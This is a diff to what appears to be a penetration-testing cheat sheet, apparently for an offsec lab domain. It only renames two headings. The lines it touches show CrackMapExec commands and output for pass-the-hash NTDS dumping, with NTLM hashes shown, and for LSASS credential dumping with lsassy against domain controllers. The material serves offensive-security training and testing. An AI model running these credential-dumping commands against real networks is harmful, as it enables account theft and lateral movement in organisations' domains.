@@ -263,7 +263,7 @@ SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234
 SMB         10.10.10.11     445    DC2019           [+] offsec\johndo:Welkom1234
 ```
 
-### Dump NTDS
+### Dump NTDS (remote)
 
 ```plain
 $ cme smb 10.10.10.10 -u johndo -H caec1e1d755119a15bfb6cd3d5994305 --ntds
@@ -277,10 +277,10 @@ SMB         10.10.10.10     445    DC2016           offsec.nl\johndo:1107:aad3b4
 SMB         10.10.10.10     445    DC2016           offsec.nl\adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:caec1e1d755119a15bfb6cd3d5994305:::
 ```
 
-### Dump LSASS
+### Dump LSASS (remote)
 
 ```plain
-$ cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy
+$ cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy 
 
 SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
 SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
